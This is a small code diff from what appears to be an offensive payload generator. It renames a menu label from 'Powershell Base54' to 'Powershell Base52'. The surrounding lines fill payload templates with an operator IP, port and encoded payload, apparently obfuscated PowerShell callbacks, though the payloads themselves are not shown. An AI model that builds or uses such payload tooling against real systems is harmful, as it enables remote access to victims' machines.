@@ -140,7 +140,7 @@ def pwsh_base52():
         payload4 = payload4.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52payload}",b52_payload).replace("{HTTP}", "http")
 
     """Appending payloads"""
-    config.PAYLOADS.append("\n[bold italic white][-] Powershell Base54[/ bold italic white]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell Base52[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload2}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload3}")
